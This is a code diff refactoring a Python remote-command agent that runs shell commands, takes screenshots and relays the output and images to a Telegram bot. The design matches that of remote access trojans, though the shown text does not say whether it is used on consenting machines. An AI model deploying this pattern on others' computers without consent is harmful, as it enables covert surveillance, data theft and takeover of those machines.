@@ -94,6 +94,8 @@ class MessageCommand(ICommand):
 
 
 class ScreenCaptureCommand(ICommand):
+    def __init__(self):
+        self.telegram = TelegramService()
     def execute(self):
         image = pyautogui.screenshot()
         filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
@@ -102,13 +104,14 @@ class ScreenCaptureCommand(ICommand):
         full_path = os.path.join(save_path, filename)
         image.save(full_path)
         print(f"[Screenshot saved] {full_path}")
-        TelegramService.send_telegram_photo(full_path)
+        self.telegram.send_telegram_photo(full_path)
         return {"status": "success", "file": full_path}
 
 
 class ShellCommand(ICommand):
     def __init__(self, command: str):
         self.command = command
+        self.telegram = TelegramService()
 
     def execute(self):
         if not self.command:
@@ -128,7 +131,7 @@ class ShellCommand(ICommand):
             output = result.stdout.strip()
             error = result.stderr.strip()
 
-            TelegramService.send_telegram_message(
+            self.telegram.send_message(
                 f"💻 Command: `{self.command}`\n✅ Output:\n{output[:3000]}\n⚠️ Error:\n{error[:3000]}"
             )
 
@@ -148,6 +151,7 @@ class CommandExecutor:
 
     @staticmethod
     def create(cmd: Dict) -> Optional[ICommand]:
+        print(f"cmd: {cmd}")
         action = cmd.get("type")
         if action == "shutdown":
             return ShutdownCommand()
@@ -167,12 +171,12 @@ class CommandExecutor:
             return LockCommand()
         elif action == "message":
             return MessageCommand(cmd.get("text", ""))
-        elif action == "screen_capture":
+        elif action == "screenshot":
             return ScreenCaptureCommand()
         elif action == "shell":
             return ShellCommand(cmd.get("command", ""))
         else:
-            print(f"[⚠️ Unknown Command Type] {cmd}")
+            print(f"[⚠️ Unknown Command Type] {action}")
             return None
 
     @staticmethod
